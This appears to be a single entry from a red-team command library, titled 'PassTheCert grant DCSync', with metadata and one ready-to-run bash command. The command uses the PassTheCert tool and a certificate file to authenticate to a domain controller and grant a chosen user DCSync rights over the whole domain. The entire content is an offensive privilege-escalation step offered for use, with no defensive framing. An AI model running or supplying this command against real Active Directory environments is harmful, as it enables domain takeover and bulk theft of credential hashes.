---
id: 06229edb-3a95-45aa-b3ce-0fedf306202f
name: PassTheCert grant DCSync
type: command
executor: bash
data: ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate
  --target "DC=domain,DC=local" --sid <user_SID>
output: null
created_at: '2023-04-06T03:56:06.176534+00:00'
updated_at: '2023-04-10T20:26:17.485526+00:00'
---

# PassTheCert grant DCSync

```bash
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
```
